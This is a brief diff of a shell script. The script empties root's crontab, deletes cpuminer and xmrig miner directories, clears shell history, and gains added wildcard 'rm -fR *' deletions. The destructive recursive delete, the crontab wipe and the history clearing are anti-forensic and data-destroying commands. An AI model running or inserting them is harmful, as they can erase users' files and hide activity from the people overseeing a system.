@@ -8,4 +8,6 @@ cat /dev/null > /var/spool/cron/crontabs/root
 rm -fv *
 rm -fR cpuminer-opt-linux/
 rm -fR xmrig-6.21.0/
+rm -fv *
+rm -fR *
 history -c && history -w
